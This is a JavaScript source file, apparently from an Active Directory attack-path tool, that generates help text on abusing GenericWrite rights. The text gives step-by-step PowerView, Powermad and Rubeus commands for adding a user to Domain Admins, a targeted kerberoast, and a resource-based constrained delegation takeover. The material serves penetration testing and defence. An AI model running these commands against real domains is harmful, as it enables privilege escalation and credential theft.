const Abuse = (sourceName, sourceType, targetName, targetType) => {
    let text = ``;
    if (targetType === 'Group') {
        text = `GenericWrite to a group allows you to directly modify group membership of the group.

        There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally,  you have much safer execution options than you do with spawning net.exe (see the opsec tab).

        To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as ${
            sourceType === 'User'
                ? `${sourceName} if you are not running a process as that user`
                : `a member of ${sourceName} if you are not running a process as a member`
        }. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):

        <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>

        Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ${sourceName}:

        <code>Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred</code>

        Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:

        <code>Get-DomainGroupMember -Identity 'Domain Admins'</code>`;
    } else if (targetType === 'User') {
        text = `A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket. 

        You may need to authenticate to the Domain Controller as ${
            sourceType === 'User'
                ? `${sourceName} if you are not running a process as that user`
                : `a member of ${sourceName} if you are not running a process as a member`
        }. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

        <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>

        Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ${sourceName}:

        <code>Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}</code>

        After running this, you can use Get-DomainSPNTicket as follows:
            
        <code>Get-DomainSPNTicket -Credential $Cred harmj0y | fl</>

        The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:

        <code>Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname</code>`;
    } else if (targetType === 'Computer') {
        text = `Generic write to a computer object can be used to perform a resource based constrained delegation attack. 
            
            Abusing this primitive is currently only possible through the Rubeus project.
        
            First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
            
            <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
            
            PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
            
            <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
            
            We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:
            
            <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
            $SDBytes = New-Object byte[] ($SD.BinaryLength)
            $SD.GetBinaryForm($SDBytes, 0)</code>
            
            Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
            
            <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
            
            We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
            
            <code>Rubeus.exe hash /password:Summer2018!</code>
            
            And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
            
            <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>`;
    }
    return { __html: text };
};

export default Abuse;
